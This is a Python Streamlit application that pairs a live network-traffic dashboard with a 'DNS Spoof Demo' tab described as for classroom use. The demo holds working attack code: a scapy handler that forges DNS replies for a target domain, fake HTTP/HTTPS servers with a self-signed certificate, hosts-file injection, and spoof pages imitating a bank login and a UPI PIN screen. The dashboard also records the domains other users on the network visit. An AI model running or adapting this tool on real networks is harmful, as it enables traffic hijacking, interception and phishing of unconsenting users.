import streamlit as st
import pandas as pd
import plotly.express as px
from scapy.all import sniff, IP, TCP, UDP, get_if_list, send
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.tls.handshake import TLSClientHello
from scapy.layers.l2 import ARP
from collections import Counter, deque
from http.server import HTTPServer, BaseHTTPRequestHandler
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import ssl
import tempfile
import os
import threading
import time
import datetime

# --- CONFIGURATION ---
MAX_RECENT_PACKETS = 100

PROTO_MAP = {
    1: "ICMP", 6: "TCP", 17: "UDP", 41: "IPv6",
    47: "GRE", 50: "ESP", 89: "OSPF", 132: "SCTP",
}

PORT_MAP = {
    80: "HTTP", 443: "HTTPS", 53: "DNS", 22: "SSH",
    21: "FTP", 25: "SMTP", 110: "POP3", 143: "IMAP",
    3389: "RDP", 3306: "MySQL", 5432: "PostgreSQL",
    8080: "HTTP-Alt", 8443: "HTTPS-Alt", 67: "DHCP",
    123: "NTP", 161: "SNMP",
}

DEFAULT_FAKE_HTML_OLD = """<!DOCTYPE html>
<html>
<head>
  <title>Secure Login</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: Arial, sans-serif; background: #1a1a2e; color: #eee;
           display: flex; justify-content: center; align-items: center; height: 100vh; }
    .demo-badge { position: fixed; top: 15px; right: 15px; background: #ff9800;
                  color: #000; padding: 6px 18px; border-radius: 20px;
                  font-weight: bold; font-size: 0.9em; z-index: 999; }
    .card { background: #16213e; padding: 40px; border-radius: 16px;
            max-width: 420px; width: 90%; box-shadow: 0 8px 32px #0008; }
    .logo { font-size: 2.5em; text-align: center; margin-bottom: 8px; }
    h2 { text-align: center; margin-bottom: 6px; color: #e94560; }
    .subtitle { text-align: center; color: #aaa; font-size: 0.85em; margin-bottom: 24px; }
    label { font-size: 0.85em; color: #aaa; margin-bottom: 4px; display: block; }
    input { width: 100%; padding: 11px 14px; border-radius: 8px; border: 1px solid #334;
            background: #0f3460; color: #fff; font-size: 0.95em; margin-bottom: 16px; }
    button { width: 100%; padding: 12px; background: #e94560; color: #fff;
             border: none; border-radius: 8px; font-size: 1em; cursor: pointer; }
    .warning { margin-top: 20px; padding: 12px; background: #e9456022;
               border: 1px solid #e94560; border-radius: 8px;
               font-size: 0.82em; text-align: center; color: #e94560; }
  </style>
</head>
<body>
  <div class="demo-badge">⚠️ CLASSROOM DEMO</div>
  <div class="card">
    <div class="logo">🏦</div>
    <h2>SecureBank Login</h2>
    <p class="subtitle">Sign in to your account</p>
    <label>Email</label>
    <input type="email" placeholder="you@example.com">
    <label>Password</label>
    <input type="password" placeholder="••••••••">
    <button onclick="alert('DNS Spoofing Demo!\\nYour request was intercepted and redirected to this fake page.')">
      Sign In
    </button>
    <div class="warning">
      ⚠️ This is a <strong>DNS Spoofing demonstration</strong>.<br>
      Your DNS query was intercepted and redirected here.<br>
      No real data is collected.
    </div>
  </div>
</body>
</html>"""

DEFAULT_FAKE_HTML = """<!DOCTYPE html>
<html>
<head>
  <title>UPI Payment</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .demo-badge {
      position: fixed;
      top: 15px;
      right: 15px;
      background: #ff9800;
      color: #000;
      padding: 6px 18px;
      border-radius: 20px;
      font-weight: bold;
      font-size: 0.9em;
    }
    .card {
      background: #ffffff;
      padding: 28px;
      border-radius: 16px;
      width: 360px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
      text-align: center;
    }
    .app-name {
      font-size: 1.3em;
      color: #5f6368;
      margin-bottom: 10px;
    }
    .merchant {
      font-size: 1.1em;
      margin: 12px 0;
      color: #202124;
    }
    .amount {
      font-size: 2.2em;
      margin: 10px 0;
      color: #202124;
      font-weight: bold;
    }
    .upi-id {
      font-size: 0.85em;
      color: #5f6368;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      border: 1px solid #ddd;
      margin-bottom: 15px;
      font-size: 1em;
      background: #fafafa;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #1a73e8;
      border: none;
      border-radius: 24px;
      font-size: 1em;
      color: #fff;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #1669c1;
    }
    .warning {
      margin-top: 18px;
      padding: 12px;
      background: #fdecea;
      border: 1px solid #f28b82;
      border-radius: 8px;
      font-size: 0.8em;
      color: #d93025;
    }
  </style>
</head>
<body>
<div class="demo-badge">⚠️ CLASSROOM DEMO</div>
<div class="card">
  <div class="app-name">UPI</div>
  <div class="merchant">Paying <strong>ABC Store</strong></div>
  <div class="amount">₹2,499</div>
  <div class="upi-id">abcstore@upi</div>
  <input type="password" placeholder="Enter UPI PIN">
  <button onclick="alert('⚠️ DNS Spoofing Demo!\n\nThis is a fake UPI page.\nAttackers can trick users into entering their PIN.\n\nAlways verify the app and URL.')">
    Pay
  </button>
  <div class="warning">
    ⚠️ This is a <strong>DNS Spoofing demonstration</strong>.<br>
    You were redirected to a fake UPI interface.<br>
    No real transaction is happening.
  </div>
</div>
</body>
</html>"""

# ─────────────────────────────────────────────
# STREAMLIT SETUP
# ─────────────────────────────────────────────
st.set_page_config(page_title="Live NetViz", page_icon="📡", layout="wide")

# ─────────────────────────────────────────────
# SHARED STATE (sniffer dashboard)
# ─────────────────────────────────────────────
@st.cache_resource
def get_shared_state():
    return {
        "proto_counts": Counter(),
        "src_ip_counts": Counter(),
        "dst_ip_counts": Counter(),
        "domain_counts": Counter(),
        "port_counts": Counter(),
        "recent_packets": deque(maxlen=MAX_RECENT_PACKETS),
        "total_bytes": 0,
        "start_time": time.time(),
        "lock": threading.Lock(),
        "paused": False,
    }

state = get_shared_state()

# ─────────────────────────────────────────────
# SHARED STATE (DNS spoof demo)
# ─────────────────────────────────────────────
@st.cache_resource
def get_spoof_state():
    return {
        "active": False,
        "target_domain": "",
        "fake_ip": "127.0.0.1",
        "iface": "",
        "spoof_log": deque(maxlen=50),
        "dns_seen": 0,
        "dns_spoofed": 0,
        "lock": threading.Lock(),
        "stop_event": threading.Event(),
        "http_server": None,
        "http_port": 80,
        "https_server": None,
        "https_port": None,
    }

spoof_state = get_spoof_state()

# ─────────────────────────────────────────────
# PACKET PROCESSING (dashboard)
# ─────────────────────────────────────────────
def process_packet(pkt):
    if state["paused"]:
        return
    with state["lock"]:
        ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        pkt_size = len(pkt)
        state["total_bytes"] += pkt_size
        proto_name = "Other"
        src_ip = dst_ip = "-"
        dst_port = "-"
        info = ""

        if pkt.haslayer(ARP):
            proto_name = "ARP"
            state["proto_counts"]["ARP"] += 1
            src_ip = pkt[ARP].psrc
            dst_ip = pkt[ARP].pdst
            info = "ARP"
        elif pkt.haslayer(IP):
            proto_num = pkt[IP].proto
            proto_name = PROTO_MAP.get(proto_num, f"Other({proto_num})")
            state["proto_counts"][proto_name] += 1
            src_ip = pkt[IP].src
            dst_ip = pkt[IP].dst
            state["src_ip_counts"][src_ip] += 1
            state["dst_ip_counts"][dst_ip] += 1
            if pkt.haslayer(TCP):
                port = pkt[TCP].dport
                service = PORT_MAP.get(port, str(port))
                state["port_counts"][service] += 1
                dst_port = service
            elif pkt.haslayer(UDP):
                port = pkt[UDP].dport
                service = PORT_MAP.get(port, str(port))
                state["port_counts"][service] += 1
                dst_port = service

        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            try:
                domain = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                state["domain_counts"][domain] += 1
                info = f"DNS: {domain}"
            except Exception:
                pass

        if pkt.haslayer(TLSClientHello):
            try:
                for ext in pkt[TLSClientHello].ext:
                    if hasattr(ext, "servernames"):
                        for server in ext.servernames:
                            domain = server.servername.decode()
                            state["domain_counts"][domain] += 1
                            info = f"TLS: {domain}"
            except Exception:
                pass

        state["recent_packets"].appendleft({
            "Time": ts, "Protocol": proto_name,
            "Source IP": src_ip, "Dest IP": dst_ip,
            "Service": dst_port, "Bytes": pkt_size, "Info": info,
        })

# ─────────────────────────────────────────────
# DNS SPOOF — packet handler
# ─────────────────────────────────────────────
def dns_spoof_handler(pkt):
    if not spoof_state["active"]:
        return
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    if pkt[DNS].qr != 0:   # only handle queries, skip responses
        return
    if not pkt.haslayer(DNSQR):
        return

    with spoof_state["lock"]:
        spoof_state["dns_seen"] += 1

    try:
        queried = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
        target = spoof_state["target_domain"].lower().strip()
        if not target or target not in queried.lower():
            return

        fake_ip = spoof_state["fake_ip"]
        iface = spoof_state["iface"]
        spoofed = (
            IP(dst=pkt[IP].src, src=pkt[IP].dst) /
            UDP(dport=pkt[UDP].sport, sport=53) /
            DNS(
                id=pkt[DNS].id,
                qr=1, aa=1, rd=pkt[DNS].rd, ra=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=fake_ip),
            )
        )
        send(spoofed, iface=iface, verbose=0)

        ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        with spoof_state["lock"]:
            spoof_state["dns_spoofed"] += 1
            spoof_state["spoof_log"].appendleft({
                "Time": ts,
                "Victim IP": pkt[IP].src,
                "Queried Domain": queried,
                "Spoofed →": fake_ip,
            })
    except Exception as e:
        with spoof_state["lock"]:
            spoof_state["spoof_log"].appendleft({
                "Time": datetime.datetime.now().strftime("%H:%M:%S"),
                "Victim IP": "ERROR",
                "Queried Domain": str(e),
                "Spoofed →": "-",
            })

# ─────────────────────────────────────────────
# DNS SPOOF — start / stop sniffer thread
# ─────────────────────────────────────────────
def start_dns_spoof_thread(iface):
    spoof_state["stop_event"].clear()

    def stop_filter(_):
        return spoof_state["stop_event"].is_set()

    t = threading.Thread(
        target=sniff,
        kwargs={
            "iface": iface,
            "filter": "udp port 53",
            "prn": dns_spoof_handler,
            "store": 0,
            "stop_filter": stop_filter,
        },
        daemon=True,
    )
    t.start()

# ─────────────────────────────────────────────
# HOSTS FILE HELPERS
# ─────────────────────────────────────────────
HOSTS_FILE = r"C:\Windows\System32\drivers\etc\hosts"
HOSTS_MARKER = "# dns-spoof-demo"

def add_hosts_entry(domain: str, ip: str):
    """Append a hosts entry for the domain pointing to ip."""
    remove_hosts_entry(domain)   # avoid duplicates
    with open(HOSTS_FILE, "a") as f:
        f.write(f"\n{ip} {domain}  {HOSTS_MARKER}\n")
        # Also cover the bare domain (without www) if www-prefixed
        if domain.startswith("www."):
            bare = domain[4:]
            f.write(f"{ip} {bare}  {HOSTS_MARKER}\n")

def remove_hosts_entry(domain: str):
    """Remove all lines we injected."""
    try:
        with open(HOSTS_FILE, "r") as f:
            lines = f.readlines()
        with open(HOSTS_FILE, "w") as f:
            for line in lines:
                if HOSTS_MARKER not in line:
                    f.write(line)
    except Exception:
        pass

def hosts_entry_exists(domain: str) -> bool:
    try:
        with open(HOSTS_FILE, "r") as f:
            return any(domain in line and HOSTS_MARKER in line for line in f)
    except Exception:
        return False

def stop_dns_spoof():
    spoof_state["stop_event"].set()
    spoof_state["active"] = False
    for key in ("http_server", "https_server"):
        if spoof_state[key]:
            threading.Thread(target=spoof_state[key].shutdown, daemon=True).start()
            spoof_state[key] = None

# ─────────────────────────────────────────────
# SELF-SIGNED CERT (for HTTPS fake server)
# ─────────────────────────────────────────────
def generate_self_signed_cert(domain: str):
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, domain)])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.datetime.now(datetime.timezone.utc))
        .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([x509.DNSName(domain)]), critical=False
        )
        .sign(key, hashes.SHA256())
    )
    cert_f = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
    key_f  = tempfile.NamedTemporaryFile(delete=False, suffix=".pem")
    cert_f.write(cert.public_bytes(serialization.Encoding.PEM))
    key_f.write(key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    ))
    cert_f.close()
    key_f.close()
    return cert_f.name, key_f.name

# ─────────────────────────────────────────────
# FAKE HTTP / HTTPS SERVERS
# ─────────────────────────────────────────────
def make_handler(html_content):
    class FakeHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html_content.encode())
        def log_message(self, *_):
            pass
    return FakeHandler

def start_fake_http_server(html_content):
    handler = make_handler(html_content)
    for port in (80, 8080, 8888):
        try:
            server = HTTPServer(("0.0.0.0", port), handler)
            spoof_state["http_server"] = server
            spoof_state["http_port"] = port
            threading.Thread(target=server.serve_forever, daemon=True).start()
            return port
        except OSError:
            continue
    return None

def start_fake_https_server(html_content, domain: str):
    try:
        cert_path, key_path = generate_self_signed_cert(domain)
    except Exception:
        return None   # cryptography not installed

    handler = make_handler(html_content)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert_path, key_path)
    # clean up temp files after loading
    os.unlink(cert_path)
    os.unlink(key_path)

    for port in (443, 8443):
        try:
            server = HTTPServer(("0.0.0.0", port), handler)
            server.socket = ctx.wrap_socket(server.socket, server_side=True)
            spoof_state["https_server"] = server
            spoof_state["https_port"] = port
            threading.Thread(target=server.serve_forever, daemon=True).start()
            return port
        except OSError:
            continue
    return None

# ─────────────────────────────────────────────
# DASHBOARD SNIFFER THREAD
# ─────────────────────────────────────────────
@st.cache_resource
def start_sniffing(iface: str):
    t = threading.Thread(
        target=sniff,
        kwargs={"iface": iface, "prn": process_packet, "store": 0},
        daemon=True,
    )
    t.start()
    return t

# ─────────────────────────────────────────────
# SIDEBAR
# ─────────────────────────────────────────────
with st.sidebar:
    st.title("⚙️ Controls")
    try:
        interfaces = get_if_list()
    except Exception:
        interfaces = ["Wi-Fi", "Ethernet"]
    default_idx = interfaces.index("Wi-Fi") if "Wi-Fi" in interfaces else 0
    selected_iface = st.selectbox("Network Interface", interfaces, index=default_idx)
    refresh_rate = st.slider("Refresh Rate (s)", 1, 10, 2)
    max_items = st.slider("Max Items per Chart", 5, 20, 10)

    st.divider()
    col_a, col_b = st.columns(2)
    with col_a:
        pause_label = "▶ Resume" if state["paused"] else "⏸ Pause"
        if st.button(pause_label, use_container_width=True):
            state["paused"] = not state["paused"]
    with col_b:
        if st.button("🗑 Clear", use_container_width=True):
            with state["lock"]:
                state["proto_counts"].clear()
                state["src_ip_counts"].clear()
                state["dst_ip_counts"].clear()
                state["domain_counts"].clear()
                state["port_counts"].clear()
                state["recent_packets"].clear()
                state["total_bytes"] = 0
                state["start_time"] = time.time()

    st.divider()
    st.subheader("📥 Export")
    if state["recent_packets"]:
        df_export = pd.DataFrame(list(state["recent_packets"]))
        st.download_button(
            "Download Packets CSV",
            df_export.to_csv(index=False),
            file_name=f"packets_{datetime.datetime.now().strftime('%H%M%S')}.csv",
            mime="text/csv",
            use_container_width=True,
        )
    else:
        st.caption("No packets to export yet.")

# ─────────────────────────────────────────────
# START DASHBOARD SNIFFER
# ─────────────────────────────────────────────
start_sniffing(selected_iface)

# ─────────────────────────────────────────────
# TABS
# ─────────────────────────────────────────────
st.title("📡 Live Network Traffic Visualizer")
tab_dashboard, tab_demo = st.tabs(["📊 Live Dashboard", "🎭 DNS Spoof Demo"])

# ══════════════════════════════════════════════
# TAB 1 — LIVE DASHBOARD
# ══════════════════════════════════════════════
with tab_dashboard:
    elapsed = time.time() - state["start_time"]
    total_pkts = sum(state["proto_counts"].values())
    pps = total_pkts / max(elapsed, 1)
    mb_captured = state["total_bytes"] / (1024 * 1024)
    duration_str = str(datetime.timedelta(seconds=int(elapsed)))

    m1, m2, m3, m4 = st.columns(4)
    m1.metric("Total Packets", f"{total_pkts:,}")
    m2.metric("Packets / sec", f"{pps:.1f}")
    m3.metric("Data Captured", f"{mb_captured:.2f} MB")
    m4.metric("Session Duration", duration_str)

    st.divider()
    col1, col2, col3 = st.columns(3)

    with col1:
        st.subheader("Protocol Distribution")
        if state["proto_counts"]:
            df = pd.DataFrame(list(state["proto_counts"].items()), columns=["Protocol", "Count"])
            fig = px.pie(df, values="Count", names="Protocol", hole=0.45)
            fig.update_layout(margin=dict(t=10, b=10, l=10, r=10), height=320)
            st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("Waiting for traffic...")

    with col2:
        st.subheader("Top Source IPs")
        if state["src_ip_counts"]:
            top = state["src_ip_counts"].most_common(max_items)
            df = pd.DataFrame(top, columns=["Source IP", "Packets"])
            fig = px.bar(df, x="Packets", y="Source IP", orientation="h",
                         color="Packets", color_continuous_scale="Blues")
            fig.update_layout(margin=dict(t=10, b=10, l=10, r=10), height=320,
                              yaxis={"autorange": "reversed"}, showlegend=False)
            st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("Waiting for traffic...")

    with col3:
        st.subheader("Top Services (Ports)")
        if state["port_counts"]:
            top = state["port_counts"].most_common(max_items)
            df = pd.DataFrame(top, columns=["Service", "Connections"])
            fig = px.bar(df, x="Service", y="Connections",
                         color="Connections", color_continuous_scale="Greens")
            fig.update_layout(margin=dict(t=10, b=10, l=10, r=10), height=320)
            st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("Waiting for traffic...")

    col4, col5 = st.columns(2)
    with col4:
        st.subheader("Visited Domains (DNS / TLS SNI)")
        if state["domain_counts"]:
            top = state["domain_counts"].most_common(max_items)
            df = pd.DataFrame(top, columns=["Domain", "Requests"])
            fig = px.bar(df, x="Requests", y="Domain", orientation="h",
                         color="Requests", color_continuous_scale="Reds")
            fig.update_layout(margin=dict(t=10, b=10, l=10, r=10), height=350,
                              yaxis={"autorange": "reversed"})
            st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("No DNS/TLS domains detected yet...")

    with col5:
        st.subheader("Top Destination IPs")
        if state["dst_ip_counts"]:
            top = state["dst_ip_counts"].most_common(max_items)
            df = pd.DataFrame(top, columns=["Destination IP", "Packets"])
            fig = px.bar(df, x="Packets", y="Destination IP", orientation="h",
                         color="Packets", color_continuous_scale="Purples")
            fig.update_layout(margin=dict(t=10, b=10, l=10, r=10), height=350,
                              yaxis={"autorange": "reversed"})
            st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("Waiting for traffic...")

    st.divider()
    st.subheader("📋 Recent Packets (live)")
    if state["recent_packets"]:
        st.dataframe(pd.DataFrame(list(state["recent_packets"])),
                     use_container_width=True, height=260)
    else:
        st.info("No packets captured yet...")

    status_icon = "🔴 Paused" if state["paused"] else "🟢 Live"
    st.caption(
        f"{status_icon}  |  Interface: **{selected_iface}**  |  "
        f"Last updated: {datetime.datetime.now().strftime('%H:%M:%S')}"
    )

# ══════════════════════════════════════════════
# TAB 2 — DNS SPOOF DEMO
# ══════════════════════════════════════════════
with tab_demo:
    st.markdown("""
    ### 🎭 DNS Spoofing Demo
    > **For educational use only.** Run this on your own isolated lab network.

    **How it works:**
    1. You pick a domain to spoof (e.g. `example.com`)
    2. This tool intercepts DNS queries for that domain on the network
    3. It replies with a **forged DNS response** pointing to this machine (`127.0.0.1`)
    4. A fake webpage is served locally — students see it instead of the real site
    """)

    st.divider()
    col_cfg, col_status = st.columns([2, 1])

    with col_cfg:
        target_domain = st.text_input(
            "Target Domain to Spoof",
            value="www.kovailabs.online",
            placeholder="e.g. www.kovailabs.online",
            help="Any DNS query containing this string will be intercepted",
        )
        fake_ip_input = st.text_input(
            "Redirect Victims To (IP)",
            value="127.0.0.1",
            help="IP of the machine running this app (usually 127.0.0.1 for local demo)",
        )
        fake_html = st.text_area(
            "Fake Page HTML",
            value=DEFAULT_FAKE_HTML,
            height=200,
            help="The HTML served to victims who visit the spoofed domain",
        )

    with col_status:
        st.markdown("#### Status")
        if spoof_state["active"]:
            st.success("🟢 Spoofing ACTIVE")
            st.info(f"Target: **{spoof_state['target_domain']}**")
            http_port = spoof_state["http_port"]
            https_port = spoof_state["https_port"]
            st.info(f"HTTP  → `http://127.0.0.1:{http_port}`")
            if https_port:
                st.info(f"HTTPS → `https://127.0.0.1:{https_port}` *(accept cert warning)*")
            else:
                st.warning("HTTPS server not started — install `cryptography`")
            st.metric("DNS Packets Seen", spoof_state["dns_seen"])
            st.metric("Queries Spoofed", spoof_state["dns_spoofed"])
            if st.button("⏹ Stop Spoofing", type="primary", use_container_width=True):
                stop_dns_spoof()
                st.rerun()
        else:
            st.warning("⚪ Spoofing INACTIVE")
            if st.button("▶ Start Spoofing", type="primary", use_container_width=True):
                if target_domain.strip():
                    spoof_state["target_domain"] = target_domain.strip().lower()
                    spoof_state["fake_ip"] = fake_ip_input.strip()
                    spoof_state["iface"] = selected_iface
                    spoof_state["active"] = True
                    spoof_state["spoof_log"].clear()
                    spoof_state["dns_seen"] = 0
                    spoof_state["dns_spoofed"] = 0
                    start_fake_http_server(fake_html)
                    start_fake_https_server(fake_html, target_domain.strip())
                    start_dns_spoof_thread(selected_iface)
                    st.rerun()
                else:
                    st.error("Enter a target domain first.")

    # --- DOMAIN MISMATCH WARNING ---
    if spoof_state["active"] and spoof_state["target_domain"] != target_domain.strip().lower():
        st.warning(
            f"⚠️ Spoof is running for **{spoof_state['target_domain']}** "
            f"but input is **{target_domain.strip()}**. "
            "Stop → Start again to apply the new domain."
        )

    # --- HOSTS FILE SECTION ---
    st.divider()
    st.subheader("🗂️ Hosts File Override (fixes race condition)")
    st.caption(
        "DNS packet spoofing can lose to the real DNS server. "
        "Injecting the hosts file **guarantees** the fake page loads on this machine."
    )

    domain_for_hosts = target_domain.strip() or spoof_state["target_domain"]
    ip_for_hosts = fake_ip_input.strip() or spoof_state["fake_ip"]

    h_col1, h_col2 = st.columns(2)
    with h_col1:
        if hosts_entry_exists(domain_for_hosts):
            st.success(f"✅ Hosts entry active: `{domain_for_hosts}` → `{ip_for_hosts}`")
            if st.button("🗑 Remove from Hosts File", use_container_width=True):
                remove_hosts_entry(domain_for_hosts)
                st.rerun()
        else:
            st.warning("No hosts entry injected yet.")
            if st.button("💉 Inject into Hosts File", type="primary", use_container_width=True):
                try:
                    add_hosts_entry(domain_for_hosts, ip_for_hosts)
                    st.rerun()
                except PermissionError:
                    st.error("Permission denied — run Streamlit as Administrator.")
    with h_col2:
        st.info(
            "**After injecting:**\n"
            "1. Run `ipconfig /flushdns` in CMD\n"
            "2. Clear browser DNS: `chrome://net-internals/#dns`\n"
            "3. Visit `http://" + (domain_for_hosts or "domain") + "` in browser"
        )

    st.divider()
    st.subheader("📋 Intercepted DNS Queries")
    if spoof_state["spoof_log"]:
        df_spoof = pd.DataFrame(list(spoof_state["spoof_log"]))
        st.dataframe(df_spoof, use_container_width=True, height=300)
    else:
        if spoof_state["active"]:
            st.info(f"Waiting for DNS queries for **{spoof_state['target_domain']}**...")
        else:
            st.info("Start spoofing to see intercepted queries here.")

    with st.expander("⚠️ Why it might not work — read this first", expanded=True):
        st.markdown("""
**Most common reason it fails: DNS over HTTPS (DoH)**

Modern browsers (Chrome, Edge, Firefox) send DNS queries **encrypted over HTTPS**
directly to Cloudflare/Google — completely bypassing our UDP port 53 sniffer.
You **must** disable DoH before the demo works.

---
#### Step 1 — Disable DoH in the browser

**Chrome / Edge:**
`Settings → Privacy and Security → Security → Use secure DNS → Turn OFF`

**Firefox:**
`Settings → General → Network Settings → Enable DNS over HTTPS → Turn OFF`

---
#### Step 2 — Clear ALL DNS caches

Run in CMD (as Admin):
```
ipconfig /flushdns
```
Then clear the **browser's** own cache too:
- Chrome/Edge: go to `chrome://net-internals/#dns` → **Clear host cache**
- Firefox: go to `about:networking#dns` → **Clear DNS Cache**

---
#### Step 3 — Visit with `http://` not `https://`

Type the full URL manually:
```
http://www.kovailabs.online
```
Do **not** let the browser auto-complete to `https://` — that will hit port 443
with a self-signed cert warning (click *Advanced → Proceed* to see the fake page).

---
#### Diagnostic — check the counters above
| DNS Seen | Spoofed | Meaning |
|----------|---------|---------|
| 0 | 0 | Sniffer not receiving packets — wrong interface or DoH still on |
| > 0 | 0 | Packets seen but domain not matching — check spelling |
| > 0 | > 0 | Working — browser DNS cache issue or HTTPS redirect |
        """)

# ─────────────────────────────────────────────
# AUTO REFRESH
# ─────────────────────────────────────────────
time.sleep(refresh_rate)
st.rerun()
